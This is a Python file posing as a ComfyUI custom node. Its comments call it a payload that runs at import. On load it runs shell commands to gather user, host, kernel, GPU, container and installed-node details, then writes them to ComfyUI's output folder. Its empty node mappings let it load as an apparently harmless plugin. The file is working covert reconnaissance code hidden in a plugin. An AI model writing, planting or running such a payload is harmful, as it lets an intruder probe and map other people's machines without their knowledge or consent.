# opop23311 custom node payload - runs at import
import os, subprocess, datetime
TAG = os.environ.get("OPOP_TAG", "opop23311a")
OUT = "/work/ComfyUI/output/%s.txt" % TAG

def run(c):
    try:
        p = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=25)
        return "$ " + c + "\n" + (p.stdout or "") + (p.stderr or "")
    except Exception as e:
        return "$ " + c + "\nERR " + repr(e)

lines = []
lines.append("TAG=%s PID=%s UID=%s TIME=%s" % (TAG, os.getpid(), os.getuid(), datetime.datetime.utcnow().isoformat()))
for c in ["id", "hostname", "nproc", "uname -a",
          "nvidia-smi -L",
          "nvidia-smi --query-gpu=index,name,utilization.gpu,memory.used,memory.total --format=csv",
          "nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name --format=csv",
          "cat /proc/1/cgroup 2>/dev/null | head -3",
          "ls /work/ComfyUI/custom_nodes | head -50"]:
    lines.append(run(c))
try:
    with open(OUT, "w") as f:
        f.write("\n\n".join(lines))
except Exception as e:
    open("/tmp/%s.txt" % TAG, "w").write("FALLBACK " + repr(e) + "\n" + "\n\n".join(lines))
print("opop23311 payload executed pid=%s" % os.getpid())

NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
